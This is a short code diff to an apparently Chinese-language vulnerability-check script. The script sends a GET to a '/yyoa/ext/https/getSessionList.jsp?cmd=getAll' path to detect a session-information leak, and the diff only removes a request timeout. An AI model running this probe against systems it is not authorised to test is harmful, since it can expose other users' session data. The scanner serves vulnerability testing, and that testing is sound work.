@@ -44,7 +44,7 @@ class poc:
     def vuln(self, netloc, scheme):
         url = "{}://{}/yyoa/ext/https/getSessionList.jsp?cmd=getAll".format(scheme, netloc)
         try:
-            result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
             if "页面存在相关内容" in result.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在敏感信息泄漏漏洞\033[0m
